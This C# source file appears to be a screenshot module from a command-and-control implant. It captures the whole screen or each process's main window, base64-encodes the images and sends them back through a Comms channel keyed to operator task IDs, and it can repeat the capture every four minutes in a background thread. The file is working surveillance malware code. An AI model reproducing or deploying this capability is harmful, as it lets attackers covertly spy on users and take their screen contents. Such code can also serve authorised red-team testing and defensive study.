using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Core.Host
{
    class Screenshot
    {
        internal static int screenshotInterval = 240000;
        internal static bool screenshotEnabled = false;
        internal static void screenshot(String taskId = null)
        {
            try
            {
                if (string.IsNullOrEmpty(taskId))
                {
                    taskId = Common.Comms.GetTaskId();
                }
                Bitmap b = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height);
                Graphics g = Graphics.FromImage(b);
                var size = new Size(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height);
                g.CopyFromScreen(0, 0, 0, 0, size);
                MemoryStream msimage = new MemoryStream();
                b.Save(msimage, System.Drawing.Imaging.ImageFormat.Png);

                Common.Comms.Exec(Convert.ToBase64String(msimage.ToArray()), null, taskId);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot perform screen capture: {e.Message}\n");
            }
        }

        internal static void screenshotallwindows(String taskId = null)
        {
            try
            {
                if (string.IsNullOrEmpty(taskId))
                {
                    taskId = Common.Comms.GetTaskId();
                }
                var processes = System.Diagnostics.Process.GetProcesses();
                foreach (var p in processes)
                {
                    try
                    {
                        IntPtr windowHandle = p.MainWindowHandle;
                        var lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "Screenshot");
                        var sOut = lTyp.GetType("WindowStation").InvokeMember("CaptureCSSingle", BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] { windowHandle }).ToString();
                        Common.Comms.Exec(sOut, null, taskId);
                    }
                    catch { }
                }


            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot perform screen capture: {e.Message}\n");
            }
        }
        internal static void runmultiscreenshot()
        {
            try
            {
                String taskId = Common.Comms.GetTaskId();
                ThreadPool.QueueUserWorkItem((state) =>
                {
                    try
                    {
                        int sShotCount = 1;
                        while (screenshotEnabled)
                        {
                            screenshot(taskId);
                            Thread.Sleep(screenshotInterval);
                            sShotCount++;
                        }
                    }
                    catch { }
                });
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot perform multi screenshot: {e}");
            }
        }
    }
}
